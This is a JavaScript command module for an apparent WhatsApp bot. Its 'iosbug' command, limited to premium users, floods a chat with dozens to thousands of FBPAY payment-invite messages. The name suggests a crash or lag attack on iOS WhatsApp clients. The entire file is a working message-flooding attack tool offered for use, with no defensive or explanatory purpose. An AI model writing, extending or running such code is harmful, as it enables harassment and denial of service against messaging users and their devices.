const { isPremium } = require('../lib/premium.js');

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

module.exports = {
  name: 'iosbug',
  description: 'Send multiple FBPAY payment invites (premium only)',
  run: async (m, { conn, prefix, command }) => {
    const senderId = (m.key.participant || m.key.remoteJid || '').split(':')[0];

    if (!isPremium(senderId)) {
      return conn.sendMessage(m.key.remoteJid, { text: '🚫 This command is for premium users only.' }, { quoted: m });
    }

    // Extract argument after command
    const args = m.text.trim().split(/\s+/).slice(1);
    if (args.length === 0) {
      return conn.sendMessage(m.key.remoteJid, { text: `❌ Example usage: ${prefix + command} 5` }, { quoted: m });
    }

    let amount = parseInt(args[0]);
    if (isNaN(amount) || amount <= 0) {
      return conn.sendMessage(m.key.remoteJid, { text: '❌ Please provide a valid positive number.' }, { quoted: m });
    }

    amount = amount * 30; // multiply by 30 as your example

    for (let i = 0; i < amount; i++) {
      await conn.relayMessage(
        m.chat,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 1814400000 // 21 days in ms
          }
        },
        {}
      );
      await sleep(1400);
    }

    return conn.sendMessage(m.key.remoteJid, { text: `✅ Sent ${amount} FBPAY payment invites.` }, { quoted: m });
  }
};
